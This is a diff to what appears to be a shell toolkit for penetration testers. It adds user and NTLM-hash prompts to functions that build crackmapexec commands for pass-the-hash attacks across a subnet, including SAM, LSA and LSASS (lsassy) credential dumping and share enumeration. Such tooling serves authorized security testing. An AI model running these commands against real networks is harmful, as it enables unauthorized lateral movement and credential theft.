@@ -44,6 +44,10 @@ nb-ad-pth-pass() {
 nb-ad-pth-exploit() {
     __check-project
     nb-vars-set-network
+    __ask "Enter a user account"
+	__check-user
+	__ask "Enter a NTLM hash"
+	__check-hash
 
 	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth"
 }
@@ -51,6 +55,10 @@ nb-ad-pth-exploit() {
 nb-ad-pth-sam() {
     __check-project
     nb-vars-set-network
+    __ask "Enter a user account"
+	__check-user
+	__ask "Enter a NTLM hash"
+	__check-hash
 
 	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth --sam"
 }
@@ -58,6 +66,10 @@ nb-ad-pth-sam() {
 nb-ad-pth-enum() {
     __check-project
     nb-vars-set-network
+    __ask "Enter a user account"
+	__check-user
+	__ask "Enter a NTLM hash"
+	__check-hash
 
 	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth --shares"
 }
@@ -65,6 +77,10 @@ nb-ad-pth-enum() {
 nb-ad-pth-lsa() {
     __check-project
     nb-vars-set-network
+    __ask "Enter a user account"
+	__check-user
+	__ask "Enter a NTLM hash"
+	__check-hash
 
 	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth --lsa"
 }
@@ -72,6 +88,10 @@ nb-ad-pth-lsa() {
 nb-ad-pth-lsassy() {
     __check-project
     nb-vars-set-network
+    __ask "Enter a user account"
+	__check-user
+	__ask "Enter a NTLM hash"
+	__check-hash
 
 	print -z "crackmapexec smb <IP>/24 -u <USER> -H <HASH> --local-auth -M lsassy"
 }
